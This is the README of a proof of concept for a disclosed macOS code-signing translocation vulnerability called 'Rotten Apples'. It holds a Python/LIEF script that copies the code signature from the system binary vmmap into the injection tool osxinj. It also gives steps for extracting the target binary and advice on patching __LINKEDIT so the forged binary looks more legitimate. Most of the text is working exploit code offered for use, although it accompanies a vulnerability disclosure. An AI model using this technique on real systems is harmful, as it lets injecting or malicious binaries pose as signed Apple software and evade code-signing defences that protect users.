# Rotten-Apples
macOS codesigning translocation vulnerability. 

Original article:
https://occamsec.com/rotten-apples-macos-codesigning-translocation-vulnerability/

This document serves to explain how to use the PoC described in the Rotten Apples vulnerability disclosure.

## The Target Binary
Compile it, sign it, run it once. Best done with XCode as it automates this process.

## The Victim Binary

Use the `lipo` command line tool to extract the x64 arch of a system binary of your choice. Make sure that the binary is a thin binary and not a fat binary with just one architecture, as LIEF has problems with the new universal file format.

### Binary Modification

```python
# -*- coding: utf8 -*-
# /usr/bin/python3
# RottenApples.py - macOS Code-Signature Translocation vulnerability
# 2021-09-21
# Dependencies: lief (pip3 install lief), x64 Mac
# License: WTFPL
import lief, sys

app = lief.parse('vmmap-x64')
f = open('vmmap-x64', 'rb')
f.seek(app.code_signature.data_offset)
signature = f.read(app.code_signature.data_size)
with open("code.sig", "wb+") as outfile:
    outfile.write(signature)
    outfile.close()
    print("Wrote detached signature.")

app2 = lief.parse('osxinj')
f2 = open('osxinj', 'r+b')
f2.seek(app2.code_signature.data_offset)
f2.write(signature)
f2.close()
```

The above snippet should be enough for transplanting the code signature into your target. In this example, we're transplanting the signature from vmmap into scen's osxinj.

Further steps to make the binary appear more appear more legitimate to the system can be accomplished by patching `_LINKEDIT` to mirror that of the victim binary. This will fix some of the CDHashes.
